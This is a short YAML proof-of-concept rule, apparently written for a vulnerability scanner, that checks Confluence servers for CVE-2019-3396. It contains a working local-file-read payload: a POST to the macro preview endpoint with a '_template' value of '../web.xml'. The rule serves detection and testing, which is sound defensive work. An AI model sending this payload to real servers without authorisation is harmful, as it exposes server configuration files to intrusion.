name: poc-yaml-Confluence-CVE-2019-3396-lfi.yml
rules:
  - method: GET
    path: /login.action
    follow_redirects: true
    expression: |
      status==200
    search: <meta id="confluence-base-url" name="confluence-base-url" content="(.+)">
  - method: POST
    path: /rest/tinymce/1/macro/preview
    headers:
      Content-Type: "application/json"
      Referer: "{{1}}"
    body: >-
      {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"../web.xml"}}}
    follow_redirects: true
    expression: |
      status==200
    search: com.atlassian.confluence.util.
detail:
  author: sharecast
  vulhub: https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396